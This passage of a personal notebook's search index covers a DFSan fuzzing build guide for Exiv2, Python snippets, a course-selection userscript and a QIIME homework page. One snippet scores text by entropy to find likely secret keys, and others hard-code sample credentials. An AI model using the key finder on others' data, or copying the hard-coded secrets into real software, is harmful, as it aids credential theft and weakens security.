Forensics\":\"https://dblp.org/db/conf/ifip11-9/\",\n            \"Computer Animation and Virtual Worlds\":\"https://dblp.org/db/journals/jvca/index.html\",\n            \"IET Computer Vision\":\"https://dblp.org/db/journals/iet-cvi/index.html\",\n            \"IET Signal Processing\":\"https://dblp.org/db/journals/iet-spr/index.html\",\n            \"International Conference on Collaborative Computing: Networking, Applications and Worksharing\":\"https://dblp.org/db/conf/colcom/index.html\",\n            \"Asia Conference on Computer and Communications Security\": \"https://dblp.org/db/conf/asiaccs/index.html\",\n        }.get(full, url)\n        if \"dblp\" not in url:\n            #print([id, simple, full, publisher, url])\n            pass\n        else:\n            url = \"/\".join(url.split(\"/\")[4:6])\n            #print(url)\n        newtable.append([id, simple, full, publisher, url])\n        if url in allccf:\n            #print(i, allccf[url]) # we find that aisaccs link is wrong\n            assert allccf[url][1] == abc # same item in different categories, should be same in ABC\n            allccf[url] = (allccf[url][0]+\"/\"+type, abc)\n        else:\n            allccf[url] = (type, abc)\n    #print(type, abc, [i[4] for i in newtable])\nopen(\"ccf.json\",\"w\").write(json.dumps(allccf))\n</code></pre>"},{"location":"dfsan/","title":"DFSan","text":""},{"location":"dfsan/#dataflow-sanitizer","title":"DataFlow Sanitizer","text":"<p>http://releases.llvm.org/8.0.0/tools/clang/docs/DataFlowSanitizer.html</p>"},{"location":"dfsan/#compiling-exiv2-with-dfsan","title":"Compiling Exiv2 with DFSan","text":"<p>dfsan require all functions (including C++ libraries) to be instructed, given source code or specified ABI list. This is a tiring work, thankfully Angora has paved our way, which utilize dfsan to locate which bytes are related to conditional branch. So, let\u2019s start building in Angora container.</p> <p>In the following steps, we will compile libcxx using dfsan first, then compile expat and zlib, finally we can build exiv2 with dfsan.</p> <pre><code># run the container, this image is based on Ubuntu 16.04.6 LTS, and contain clang-7 and required abi list file.\nalias d=docker\nd pull zjuchenyuan/angora\nd run -it --privileged -v /data:/data -w /data zjuchenyuan/angora /bin/bash\n\n# create our ABI list file\ncd /data\ncat /angora/llvm_mode/build/dfsan_rt/share/dfsan_abilist.txt &gt; mylist.txt\ncat /angora/llvm_mode/dfsan_rt/abilibstdc++.txt &gt;&gt; mylist.txt\n\n# download and compile libc++, ref: https://github.com/AngoraFuzzer/Angora/blob/master/llvm_mode/libcxx/compile.sh\napt install -y ninja-build\n\nLLVM_VERSION=7.0.0\nCUR_DIR=/data\nCLANG_SRC=${CUR_DIR}/llvm_src\n\nwget http://releases.llvm.org/${LLVM_VERSION}/llvm-${LLVM_VERSION}.src.tar.xz\nwget http://releases.llvm.org/${LLVM_VERSION}/cfe-${LLVM_VERSION}.src.tar.xz\nwget http://releases.llvm.org/${LLVM_VERSION}/compiler-rt-${LLVM_VERSION}.src.tar.xz\nwget http://releases.llvm.org/${LLVM_VERSION}/libcxx-${LLVM_VERSION}.src.tar.xz\nwget http://releases.llvm.org/${LLVM_VERSION}/libcxxabi-${LLVM_VERSION}.src.tar.xz\nwget http://releases.llvm.org/${LLVM_VERSION}/libunwind-${LLVM_VERSION}.src.tar.xz\nwget http://releases.llvm.org/${LLVM_VERSION}/clang-tools-extra-${LLVM_VERSION}.src.tar.xz\n\ntar -Jxf ${CUR_DIR}/llvm-${LLVM_VERSION}.src.tar.xz mv llvm-${LLVM_VERSION}.src $CLANG_SRC\ncd ${CLANG_SRC}/tools\ntar -Jxf ${CUR_DIR}/cfe-${LLVM_VERSION}.src.tar.xz mv cfe-${LLVM_VERSION}.src clang\ncd ${CLANG_SRC}/tools/clang/tools\ntar -Jxf ${CUR_DIR}/clang-tools-extra-${LLVM_VERSION}.src.tar.xz mv clang-tools-extra-${LLVM_VERSION}.src extra\ncd ${CLANG_SRC}/projects\ntar -Jxvf ${CUR_DIR}/compiler-rt-${LLVM_VERSION}.src.tar.xz\nmv compiler-rt-${LLVM_VERSION}.src compiler-rt\ntar -Jxvf ${CUR_DIR}/libcxx-${LLVM_VERSION}.src.tar.xz\nmv libcxx-${LLVM_VERSION}.src libcxx\ntar -Jxvf ${CUR_DIR}/libcxxabi-${LLVM_VERSION}.src.tar.xz\nmv libcxxabi-${LLVM_VERSION}.src libcxxabi\ntar -Jxvf ${CUR_DIR}/libunwind-${LLVM_VERSION}.src.tar.xz\nmv libunwind-${LLVM_VERSION}.src libunwind\ncp ./libcxxabi/include/*  ./libcxx/include\n\nmkdir -p /data/build_llvm &amp;&amp; cd /data/build_llvm\nexport CC=\"clang -ldl -lrt -lpthread -fsanitize=dataflow -fsanitize-blacklist=/data/mylist.txt\" CXX=\"clang++ -ldl -lrt -lpthread -fsanitize=dataflow -fsanitize-blacklist=/data/mylist.txt\"\ncmake -G Ninja ../llvm_src/  -DLIBCXXABI_ENABLE_SHARED=NO -DLIBCXX_ENABLE_SHARED=NO -DLIBCXX_CXX_ABI=libcxxabi\nninja cxx cxxabi\n\nexport CC=\"clang -L/data/build_llvm/lib -stdlib=libc++ -lc++abi -ldl -lrt -lpthread -fsanitize=dataflow -fsanitize-blacklist=/data/mylist.txt -ggdb\" CXX=\"clang++ -L/data/build_llvm/lib -stdlib=libc++ -lc++abi -ldl -lrt -lpthread -fsanitize=dataflow -fsanitize-blacklist=/data/mylist.txt -ggdb\"\n\n# download dependency (expat and zlib) source code\ncd /data\nsed -i 's/# deb-src/deb-src/g' /etc/apt/sources.list\napt update\napt source zlib1g-dev libexpat1-dev\n\n# compile expat\ncd /data/expat-2.1.0\n./configure --prefix=/data/expat\nmake install -j\n\n# compile zlib\ncd /data/zlib-1.2.8.dfsg/\n./configure --prefix=/data/zlib\nmake install -j\n\n# download source code\ncd /data\nwget http://exiv2.org/releases/exiv2-0.26-trunk.tar.gz\ntar zxvf exiv2-0.26-trunk.tar.gz\ncd /data/exiv2-trunk\n./configure --disable-shared --with-expat=/data/expat --with-zlib=/data/zlib\n\n# now, we get our binary file: ./bin/exiv2, about 38MB\n</code></pre>"},{"location":"dfsan/#qa","title":"Q&amp;A","text":""},{"location":"dfsan/#why-docker-image-zjuchenyuanangora","title":"Why docker image <code>zjuchenyuan/angora</code>","text":"<p>Just to use already built-in clang-7, and two abi list files</p>"},{"location":"dfsan/#why-ldl-lrt-lpthread","title":"Why <code>-ldl -lrt -lpthread</code>","text":"<p>It\u2019s required for cmake cxx, otherwise build error like <code>Host compiler appears to require libatomic, but cannot find it</code></p>"},{"location":"dfsan/#why-compile-expat-and-zlib","title":"Why compile expat and zlib","text":"<p>exiv2 depends on these two libraries, and DFSan require their source code to be compiled with DFSan.</p> <p>Or, you can follow instructions here: https://github.com/AngoraFuzzer/Angora/issues/38, to create an abi list for libraries.</p> <pre><code>/angora/tools/gen_library_abilist.sh  /usr/lib/x86_64-linux-gnu/libz.so  discard &gt;&gt; /data/mylist.txt\n/angora/tools/gen_library_abilist.sh  /usr/lib/x86_64-linux-gnu/libexpat.so  discard &gt;&gt; /data/mylist.txt\n</code></pre>"},{"location":"dfsan/#why-disable-shared","title":"Why <code>--disable-shared</code>","text":"<p>This is to build a single binary file for easier fuzzing.</p>"},{"location":"dfsan/#wanna-debug-no-optimization","title":"Wanna debug? No optimization","text":"<p>Compiling Exiv2 with DFSan, with -O0</p> <pre><code># let's continue our building process, use -O0 to facilitate debugging\ncd /data/exiv2-trunk\nCFLAGS='-O0' CXXFLAGS='-O0' ./configure --disable-shared --with-expat=/data/expat --with-zlib=/data/zlib make clean; find . -name '*.o' -delete\nmake -j\n# now we get bin/exiv2, about 44MB\n</code></pre>"},{"location":"gist/","title":"gist \u8bb0\u5f55\u4e00\u4e9b\u4ee3\u7801\u7247\u6bb5","text":""},{"location":"gist/#print","title":"print\u7684\u65f6\u5019\u987a\u5e26\u5e26\u4e0a\u65f6\u95f4","text":"<p>\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u7684\u597d\u5904\u4e0d\u4ec5\u662f\u663e\u793a\u65f6\u95f4\uff0c\u800c\u4e14\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5c06\u5f80\u5c4f\u5e55\u8f93\u51fa\u6539\u4e3a\u5199\u6587\u4ef6\uff1b\u66f4\u4f18\u96c5\u7684\u65b9\u5f0f\u662f\u7528logging</p> <pre><code>import time\ndef myprint(*args, **kwargs):\n    args = list(args)\n    args[0] = \"[\"+time.strftime(\"%Y-%m-%d %H:%M:%S\")+\"] \" + str(args[0])\n    print(*args, **kwargs)\n</code></pre> <p>\u4f7f\u7528\u7684\u65f6\u5019\u5c31\u548cprint\u4e00\u6837\u4f7f\u7528\uff0c\u53ef\u4ee5\u4f20\u5165\u591a\u4e2a\u53c2\u6570</p> <pre><code>myprint(\"aha myprint\", 666)\n</code></pre>"},{"location":"gist/#mysql","title":"\u8fde\u63a5mysql\u6279\u91cf\u63d2\u5165\u3001\u67e5\u8be2","text":"<p>config.py:</p> <pre><code>MYSQL_DB = \"web\"\nMYSQL_USER = \"web\"\nMYSQL_PASSWORD = \"sEcret_strOng_passw0rd\"\nMYSQL_HOST = \"localhost\"\nMYSQL_PORT = 3306\n</code></pre> <pre><code>from config import MYSQL_HOST, MYSQL_PORT, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DB\nimport threading, pymysql, warnings, time\nthread_data = threading.local()\n\ndef db():\n    global thread_data\n    conn = pymysql.connect(user=MYSQL_USER,passwd=MYSQL_PASSWORD,host=MYSQL_HOST,port=MYSQL_PORT,db=MYSQL_DB ,charset='utf8',init_command=\"set NAMES utf8mb4\", use_unicode=True)\n    thread_data.__dict__[\"conn\"] = conn\n    return conn\n\ndef runsql(sql, *args, onerror='raise', returnid=False, allow_retry=True):\n    global thread_data\n    conn = thread_data.__dict__.get(\"conn\")\n    if len(args)==1 and isinstance(args[0], list):\n        args = args[0]\n    if not conn:\n        conn = db()\n    if not conn.open:\n        conn = db()\n    cur = conn.cursor()\n    try:\n        conn.ping()\n    except:\n        print(\"conn.ping() failed, reconnect\")\n        conn = db()\n    try:\n        with warnings.catch_warnings():\n            warnings.simplefilter(\"ignore\")\n            cur.execute(sql, args)\n    except pymysql.err.OperationalError as e:\n        conn.commit()\n        cur.close()\n        if allow_retry and (\"Lost connection to MySQL\" in str(e) or \"MySQL server has gone away\" in str(e)):\n            conn.close()\n            conn = db()\n            return runsql(sql, *args, onerror=onerror, returnid=returnid, allow_retry=False)\n        else:\n            raise\n    except:\n        conn.commit()\n        cur.close()\n        if onerror==\"ignore\":\n            return False\n        else:\n            raise\n    if returnid:\n        cur.execute(\"SELECT LAST_INSERT_ID();\")\n        result = list(cur)[0][0]\n    else:\n        result = list(cur)\n    conn.commit()\n    cur.close()\n    return result\n\ndef tags_tagname2ids_set(tagname):\n\"\"\"\n    select\u67e5\u8be2\u793a\u4f8b\n    \u8fd4\u56de\u5305\u542b\u6807\u7b7etagname\u7684\u5e16\u5b50id\u96c6\u5408\n    \"\"\"\n    sql = \"select topicid from tags where tagname=%s\"\n    sqlresult = runsql(sql, tagname)\n    return set([i[0] for i in sqlresult])\n\ndef usersettings_write_bool(userid, username, settingname, settingvalue):\n\"\"\"\n    replace\u67e5\u8be2\u793a\u4f8b\n    \u5199\u5165\u7528\u6237\u914d\u7f6e\u4fe1\u606f\u81f3usersetting\u8868\n    \u8fd4\u56debool\n    \"\"\"\n    sql = \"replace into usersettings values (%s, %s, %s, %s)\"\n    try:\n        runsql(sql, userid, username, settingname, settingvalue)\n        return True\n    except:\n        traceback.print_exc()\n        return False\n</code></pre>"},{"location":"gist/#_1","title":"\u5927\u5c0f\u5199\u4e0d\u654f\u611f\u5b57\u5178","text":"<pre><code>from requests.structures import CaseInsensitiveDict\nmydict = CaseInsensitiveDict(mydict)\n</code></pre>"},{"location":"gist/#mpms","title":"mpms\u591a\u7ebf\u7a0b\u4e0b\u6bcf\u4e2a\u7ebf\u7a0b\u5355\u72ec\u53d8\u91cf","text":"<p>\u81ea\u5df1\u5199\u7684\u7c7b\u4e0d\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\uff0c\u6240\u4ee5\u5728\u591a\u7ebf\u7a0b\u4e0b\u8981\u505a\u5230\u6bcf\u4e2a\u7ebf\u7a0b\u81ea\u5df1\u4e00\u4e2a\u53d8\u91cf\u4e92\u4e0d\u5e72\u6270</p> <p>mpms\u4e0b\u4f7f\u7528EasyLogin\u5b8c\u6574\u793a\u4f8b\u4ee3\u7801\u6a21\u677f\uff0c \u5148\u8981\u4f7f\u7528\u6211fork\u7684\u7248\u672c \u52a0\u4e0a\u4e86len\u652f\u6301\uff1a</p> <pre><code>wget https://d.py3.io/mpms.py\n</code></pre> <pre><code>from mpms import MPMS\nfrom EasyLogin import EasyLogin\nimport threading\nthread_data = threading.local()\n\nimport time\nmyprint = lambda s: print(\"[{showtime}] {s}\".format(showtime=time.strftime(\"%Y-%m-%d %H:%M:%S\"), s=s))\n\ndef worker(id):\n    global thread_data\n    a = thread_data.__dict__.get(\"a\")\n    if not a:\n        a = EasyLogin()\n        thread_data.__dict__[\"a\"] = a\n    pass # do the stuff, like a.get\n    return result\n\ndef handler(meta, result):\n    # meta[\"fp\"].write ...\n    pass # do the stuff\n\nif __name__ == \"__main__\":\n    meta = {\"fp\": open(\"result.txt\",\"w\",encoding=\"utf-8\")}\n    m = MPMS(worker, handler, 2, 2, meta=meta)\n    m.start()\n    for i in range(...):\n        m.put(i)\n    while len(m)&gt;10:\n        myprint(\"Remaning \"+str(len(m)))\n        time.sleep(2)\n    m.join()\n    myprint(\"Done!\")\n</code></pre>"},{"location":"gist/#dict_add_list","title":"\u5c06\u503c\u5b58\u5165\u5b57\u5178\u4e2d\u7684\u5217\u8868 dict_add_list","text":"<p>\u5224\u65adkey\u662f\u5426\u5b58\u5728 \u5e94\u8be5\u6709\u66f4\u597d\u7684\u65b9\u6cd5\uff1f\u8fd9\u4e2a\u5b9e\u73b0\u8fd8\u662f\u5f88naive\u7684</p> <pre><code>def dict_add_list(dictname, key, value):\nif key not in dictname:\ndictname[key] = [value]\nelse:\ndictname[key].append(value)\n\n# \u5982\u679c\u5b57\u5178\u662f\u5b58\u50a8count\u8ba1\u6570\u7684\u8bdd \u7528\u8fd9\u4e2a\ndef dict_incr(dictname, key):\nif key not in dictname:\ndictname[key] = 1\nelse:\ndictname[key] += 1\n</code></pre>"},{"location":"gist/#aes","title":"\u4f7f\u7528AES\u52a0\u5bc6\u5b57\u7b26\u4e32","text":"<p>https://github.com/ricmoo/pyaes</p> <p>\u9996\u5148 <code>pip install pyaes -t .</code> \u6ce8\u610f\u6bcf\u6b21\u52a0\u5bc6\u7684\u65f6\u5019\u90fd\u9700\u8981\u91cd\u65b0\u521d\u59cb\u5316aes</p> <p>\u52a0\u5bc6\uff1a</p> <pre><code>plaintext = \"hello world\"\n\nimport pyaes,base64\naes = pyaes.AESModeOfOperationCTR(b\"This_key_for_demo_purposes_only!\")\nencrypted_text = base64.b64encode(aes.encrypt(plaintext.encode(\"utf-8\")))\n\nprint(encrypted_text) # ipkEJevbnsfbEm4=\n</code></pre> <p>\u89e3\u5bc6\uff1a</p> <pre><code>encrypted_text = \"ipkEJevbnsfbEm4=\"\n\nimport pyaes, base64\naes = pyaes.AESModeOfOperationCTR(b\"This_key_for_demo_purposes_only!\")\nplaintext = aes.decrypt(base64.b64decode(encrypted_text)).decode()\n\nprint(plaintext) # hello world\n</code></pre>"},{"location":"gist/#python-mn","title":"Python\u753b\u56fe \u4e0a\u65b9\u989c\u8272\uff0c\u7136\u540eM*N\u4e2a\u5c0f\u56fe","text":"<p>TODO: \u589e\u52a0\u4e00\u5f20\u793a\u610f\u56fe</p> <pre><code>import json\nimport matplotlib.pyplot as plt \nimport seaborn as sns\nimport matplotlib.gridspec as gridspec\nimport gzip\nimport pickle\nimport os\nimport shutil\n\ndef plotmatrix(M, N, DATA, labels, colors, xlabel, ylabel, fontsize, sep):\n\"\"\"\n    M: how many rows, like 4\n    N: how many cols, like 5\n    DATA: [{\n        \"name\": \"figure title\", \n        \"lines\":[ \n            [[...], [...]],\n        ]\n    }]\n    labels: the label of lines, like [fuzzerA, fuzzerB]\n    colors: color of lines, like [red, blue]\n    xlabel: like \"#Time (days)\"\n    fontsize: 13\n    sep: (wspace, hspace) like (0.5, 0.5)\n    \"\"\"\n    assert M*N &gt;= len(DATA)\n    fig = plt.figure(figsize=(M*5,N*1.2))\n    outer = gridspec.GridSpec(2, 1, wspace=0.2, hspace=0.4, height_ratios= [1, 10])\n    inner = gridspec.GridSpecFromSubplotSpec(M,N,subplot_spec=outer[1], wspace=sep[0], hspace=sep[1])\n\n    index = -1\n    for data in DATA:\n        index += 1\n        ax = plt.Subplot(fig, inner[index])\n        fig.add_subplot(ax)\n        plt.title(data[\"name\"])\n        for i, line in enumerate(data[\"lines\"]):\n            plt.plot(*line, label=labels[i], color=colors[i])\n            ax = plt.gca()\n            ax.title.set_fontsize(fontsize)\n            plt.xlabel(xlabel, fontsize=fontsize-2)\n            plt.ylabel(ylabel, fontsize=fontsize-2)\n    ax=plt.Subplot(fig, outer[0])\n    ax.set_ylabel('')\n    ax.set_xlabel('')\n    fig.add_subplot(ax)\n    ax = sns.boxplot(x=[0]*len(labels), y=[0]*len(labels), sym='', hue=labels, linewidth=0, palette=colors, ax=ax, boxprops={\"linestyle\":\"None\"})\n    ax.spines['right'].set_visible(False)\n    ax.spines['top'].set_visible(False)\n    ax.spines['left'].set_visible(False)\n    ax.spines['bottom'].set_visible(False)\n    plt.xticks([])\n    plt.yticks([])\n    handles, labels = ax.get_legend_handles_labels()\n    plt.legend(handles, labels, loc='center', ncol=8, fontsize=fontsize-1)\n    plt.show()\n</code></pre>"},{"location":"gist/#zipc","title":"\u4ece\u4e00\u7cfb\u5217zip\u6587\u4ef6\u4e2d\u63d0\u53d6C\u4ee3\u7801","text":"<pre><code>from zipfile import ZipFile\nimport os\nfor i in os.listdir():\n    print(i)\n    z = ZipFile(i)\n    files = [i.filename for i in z.filelist if i.filename.lower().endswith(\".c\") or i.filename.lower().endswith(\".cpp\")]\n    files = [i for i in files if \"StdAfx\" not in i]\n    print(files)\n    contents = b\"\"\n    for f in files:\n        c = z.open(f).read()\n        if c in contents:\n            continue\n        contents += c\n    open(\"../output/\"+i.split(\".\")[0]+\".asm\", \"wb\").write(contents)\n</code></pre>"},{"location":"gist/#_2","title":"\u5728\u4e00\u6279\u6587\u672c\u4e2d\u67e5\u627e\u53ef\u80fd\u7684\u5bc6\u94a5","text":"<p>\u5bc6\u94a5\u5b57\u7b26\u4e32\u4e00\u822c\u4e3a\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u800c\u975e\u82f1\u6587\u5355\u8bcd\uff0c\u6839\u636e\u8fd9\u4e00\u7279\u5f81\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53bb\u9664\u5e38\u89c1\u82f1\u6587\u5355\u8bcd\u540e\u7684\u4fe1\u606f\u71b5\u8fd9\u4e00\u7279\u5f81\u6765\u627e\u51fa\u53ef\u80fd\u7684\u5bc6\u94a5\u5b57\u7b26\u4e32</p> <pre><code>import re\nfrom password_strength import PasswordStats\ncommonwords = set(i.strip() for i in open(\"google-10000-english.txt\").readlines())\ndef text_entropy(text):\n    for word in re.split('[^a-zA-Z]', text):\n        if word in commonwords:\n            text = text.replace(word, \"\")\n    if not text:\n        return 0\n    return PasswordStats(text).strength()\n</code></pre> <p>\u53c2\u8003\uff1a</p> <ul> <li>https://pypi.org/project/password-strength/</li> <li>https://github.com/first20hours/google-10000-english/</li> </ul>"},{"location":"zjugrshelper/","title":"ZJU grs helper \u6d59\u5927\u7814\u7a76\u751f\u9009\u8bfe\u52a9\u624b","text":"<p>\u7248\u672c: v0.5.0</p> <p>\u76ee\u524d\u7684\u529f\u80fd\u5217\u8868\uff1a</p> <ul> <li>\u201c\u5168\u6821\u5f00\u8bfe\u60c5\u51b5\u67e5\u8be2\u201d\u9875\u9762 \u76f4\u63a5\u8fdb\u5165\u9009\u8bfe\u2014\u2014\u4e0d\u518d\u8ff7\u832b\u4e8e\u6ca1\u5f00\u7684\u8bfe\u7a0b</li> <li>\u6574\u5408\u67e5\u8001\u5e08\u5206\u6570\u4e0e\u8bc4\u8bba\u663e\u793a\uff0c\u9009\u8bfe\u754c\u9762\u76f4\u63a5\u770b\u8bc4\u5206\u2014\u2014\u9009\u4e2a\u597d\u70b9\u7684\u8001\u5e08\u5457</li> <li>\u53ea\u770b\u7279\u5b9a\u6821\u533a\u7684\u8bfe\u7a0b\u73ed\u7ea7\u2014\u2014\u4e0d\u60f3\u6821\u533a\u95f4\u5954\u6ce2\uff1f\u51cf\u8f7b\u4eba\u5de5\u7b5b\u9009\u8d1f\u62c5</li> <li>\u7981\u7528\u9876\u90e8\u9f20\u6807\u5207\u6362\u4e8b\u4ef6\uff0c\u4e0d\u7528\u518d\u5c0f\u5fc3\u7ffc\u7ffc\u5730\u79fb\u52a8\u9f20\u6807</li> <li>\u767b\u5f55\u9875\u9762\u81ea\u52a8\u8bc6\u522b\u9a8c\u8bc1\u7801 \u5982\u679c\u8bc6\u522b\u6709\u8bef\u53ef\u4ee5\u70b9\u51fb\u9a8c\u8bc1\u7801\u56fe\u7247\u518d\u6b21\u8bc6\u522b</li> </ul>"},{"location":"zjugrshelper/#_1","title":"\u5b89\u88c5\u65b9\u6cd5","text":"<p>\u7528 Chrome \u7684\u4eba\u90fd\u9700\u8981\u77e5\u9053\u7684\u300c\u795e\u5668\u300d\u6269\u5c55\uff1aTampermonkey\u4f7f\u7528\u8be6\u89e3</p> <p>\u7136\u540e\u6233\u8fd9\u4e2a\u94fe\u63a5 \u786e\u8ba4\u5b89\u88c5\uff1a</p> <p>https://github.com/zjuchenyuan/notebook/raw/master/code/zju_grs_helper.user.js</p> <p>\u7136\u540e\u5c31\u80fd\u8fdb\u5165\u9009\u8bfe\u54af\uff1a\u5982\u5168\u6821\u5f00\u8bfe\u60c5\u51b5\u67e5\u8be2</p> <p>http://grs.zju.edu.cn/py/page/student/lnsjCxdc.htm</p> <p>\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d \u9047\u5230\u4ee5\u4e0b\u5f39\u6846\u8bf7\u52a1\u5fc5\u9009\u62e9\u603b\u662f\u5141\u8bb8\u57df\u540d</p> <p></p> <p>\u8c01\u80fd\u6559\u6559\u6211\u4e3a\u5565\u7528<code>@connect chalaoshi.cn</code>\u5c31\u662f\u4e0d\u884c\u554a</p>"},{"location":"zjugrshelper/#_2","title":"\u914d\u7f6e\u9879","text":"<p>\u53ea\u663e\u793a\u7279\u5b9a\u6821\u533a\u8bfe\u7a0b\uff1a\u4fee\u6539\u4ee3\u7801\u4e2d\u7684<code>CONFIG_XQ</code>\u53d8\u91cf</p>"},{"location":"zjugrshelper/#_3","title":"\u4f7f\u7528\u65b9\u6cd5","text":"<ol> <li>\u767b\u5f55\u9009\u8bfe\u7f51\u7ad9 http://grs.zju.edu.cn/allogene/page/home.htm</li> <li>\u6253\u5f00\u201c\u5168\u6821\u5f00\u8bfe\u60c5\u51b5\u67e5\u8be2\u201d\u9875\u9762\uff08<code>\u57f9\u517b</code>\u7684\u6700\u53f3\u4fa7\u9879\uff09 http://grs.zju.edu.cn/py/page/student/lnsjCxdc.htm</li> <li> <p>\u9009\u62e9<code>\u5f00\u8bfe\u5b66\u9662</code>\uff0c\u4f8b\u5982<code>\u7ecf\u6d4e\u5b66\u9662</code>\uff0c\u67e5\u8be2 </p> <p></p> <p>\u53ef\u89c1<code>\u5f00\u8bfe\u53f7</code>\u73b0\u5728\u53ef\u4ee5\u70b9\u51fb\uff0c\u627e\u5230\u4f60\u60f3\u9009\u7684\u8bfe\u7a0b\uff0c\u5373\u53ef\u8fdb\u5165\u9009\u8bfe</p> </li> <li> <p>\u5728\u9009\u8bfe\u5217\u8868\u4e2d\u663e\u793a\u67e5\u8001\u5e08\u7f51\u7ad9\u4e0a\u7684\u8bc4\u5206\u6570\u636e\uff08\u5982\u679c\u6709\u591a\u6761\u6570\u636e\u5219\u90fd\u663e\u793a\uff09</p> <p></p> </li> <li> <p>\u53ef\u4ee5\u70b9\u5f00\u8bc4\u5206\u6570\u636e\u67e5\u770b\u8bc4\u8bba \u867d\u7136\u73b0\u5728\u6837\u5f0femmmm</p> <p></p> </li> </ol>"},{"location":"zjugrshelper/#_4","title":"\u6b22\u8fce\u53cd\u9988\u4e0e\u8d21\u732e","text":"<p>\u4f7f\u7528\u9047\u5230bug\uff1f\u9700\u8981\u66f4\u591a\u529f\u80fd\uff1f\u6765\u63d0\u4e2aissue\u5427\uff1a</p> <p>https://github.com/zjuchenyuan/notebook/issues</p> <p>\u6b22\u8fce\u7ed9\u4e2astar\u54af\uff1a</p> <p>https://github.com/zjuchenyuan/notebook</p>"},{"location":"%E8%B0%88%E8%B0%88%E5%AE%89%E5%85%A8/","title":"How to keep safe?","text":"<ul> <li> <p>The Big Brother Is Watching You</p> </li> <li> <p>\u95f7\u58f0\u53d1\u5927\u8d22\u624d\u662f\u6700\u543c\u6ef4</p> </li> <li> <p>\u4efb\u4f55\u670d\u52a1\u5668\u3001\u670d\u52a1\u63d0\u4f9b\u5546\u4e0a\u7edd\u5bf9\u4e0d\u80fd\u660e\u6587\u5b58\u50a8\u6d89\u5bc6\u6587\u4ef6\u3001\u670d\u52a1\u5668\u5bc6\u94a5\u3001\u5bc6\u7801\u7b14\u8bb0</p> </li> <li> <p>\u5907\u4efd\u6587\u4ef6\u3001\u5386\u53f2\u90ae\u4ef6\u7684\u5b89\u5168\u6027\u66f4\u5e94\u91cd\u89c6\uff0c\u53ca\u65f6\u6e05\u7a7a\u5386\u53f2\u6587\u4ef6\uff0c\u7ed9\u653b\u51fb\u8005\u66f4\u5c11\u7684\u7ebf\u7d22\u80fd\u6709\u6548\u52a0\u5927\u653b\u51fb\u96be\u5ea6</p> </li> <li> <p>\u542f\u7528\u4e00\u5207\u80fd\u542f\u7528\u7684\u4e24\u6b65\u9a8c\u8bc1\uff0c\u4e0d\u8981\u4f7f\u7528\u6d4f\u89c8\u5668\u7684\u4fdd\u5b58\u5bc6\u7801\u529f\u80fd</p> </li> <li> <p>\u8ba9\u653b\u51fb\u8005\u8ff7\u5931\u5728\u4e00\u5927\u7fa4\u65e0\u7528\u6587\u4ef6\u4e2d\u6216\u8bb8\u662f\u4e00\u79cd\u597d\u65b9\u6cd5</p> </li> <li> <p>\u5bf9\u6280\u672f\u3001\u6cd5\u5f8b\u5fc3\u5b58\u656c\u754f\uff0c\u5bf9\u5f85\u5b89\u5168\u4e0d\u80fd\u5077\u61d2\uff01</p> </li> <li> <p>\u5468\u671f\u6027\u66f4\u6362\u5bc6\u7801\u548c\u670d\u52a1\u5668\u5bc6\u94a5</p> </li> </ul>"},{"location":"doc/biology/ecology/","title":"\u751f\u6001\u6570\u636e\u5904\u7406\uff0c\u4f7f\u7528QIIME","text":""},{"location":"doc/biology/ecology/#_1","title":"\u4f5c\u4e1a\u8981\u6c42","text":"<ol> <li>De-novo OTU picking\u4ee5\u53caOTU table\u7684\u5236\u4f5c</li> <li>alpha\u591a\u6837\u6027\u5206\u6790\uff1a\u4f18\u52bf\u79cd(&gt;5%/10%)\u7684Relative Abundance\u5206\u5e03\u56fe\uff1bRarefaction Curve( Shannon, Simpson, Observed species)</li> <li>beta\u591a\u6837\u6027\u5206\u6790\uff1a Unweighted/Weighted Unifrac PCoA\u5206\u6790</li> <li>\u7fa4\u4f53\u6027\u5206\u6790\uff1aNMDS\u5206\u6790\u2013R    \u5dee\u5f02\u5206\u6790\uff08Adonis\uff0cANOSIM\uff0cMRPP\uff09\u2013R</li> </ol>"},{"location":"doc/biology/ecology/#obtaining-the-data","title":"\u83b7\u5f97\u6570\u636e Obtaining the data","text":"<p>\u4ece\u7fa4\u5171\u4eab\u4e0b\u8f7d\u5230\u4e09\u4e2a\u6587\u4ef6\uff0c\u7b80\u4ecb\uff1a</p>"},{"location":"doc/biology/ecology/#bf_maptxt-510kb","title":"BF_Map.txt 5.10KB","text":"<p>\u8fd9\u662f\u5bf9\u539f\u59cb\u6d4b\u5e8ffna\u6587\u4ef6\u7684\u63cf\u8ff0\uff0c\u662f\u539f\u59cb\u6570\u636e</p> <p>|SampleID|BarcodeSequence|LinkerPrimerSequence|Treatment|Plate|Description| | --------   | -----:  | :----:  | |\u6837\u672cID|\u7528\u4e8e\u533a\u5206\u6837\u672c\u7684\u5e8f\u5217|\u6d4b\u5e8f\u65f6\u52a0\u4e0a\u7684\u5e8f\u5217|\u6837\u672c\u7684\u5904\u7406\uff0cControl\u4e0eWarming||\u63cf\u8ff0\uff0c\u6709TagA,TagB,TagC|</p>"},{"location":"doc/biology/ecology/#otu_table_ftxt-239mb","title":"otu_table_F.txt 23.9MB","text":"<p>OTU\u662f\u5728\u6570\u91cf\u5206\u7c7b\u5b66\u65b9\u9762\u4f5c\u4e3a\u5bf9\u8c61\u7684\u5206\u7c7b\u5355\u4f4d</p> <p>\u8ba1\u7b97\u5f97\u51fa\u7684OTU Table</p> <p>\u6bcf\u884c\u4e00\u4e2aOTU\uff0c\u5982\u679c\u5339\u914d\u5230\u6570\u636e\u5e93\u4e0a\u6709\u5fae\u751f\u7269\u7684\u7269\u79cd\u5206\u7c7b\u6570\u636e\uff0c\u4ee5\u53ca\u6bcf\u4e2a\u6837\u672c\u662f\u5426\u5305\u542b\u8fd9\u4e2aOTU\u2013\u5305\u542b\u4e3a1\uff0c\u4e0d\u5305\u542b\u4e3a0</p>"},{"location":"doc/biology/ecology/#otus_bfrar-367mb","title":"otus_BF.rar 36.7MB","text":"<p>\u5185\u542botus_BF\u6587\u4ef6\u5939\uff0c\u4e3aDe novo OTU 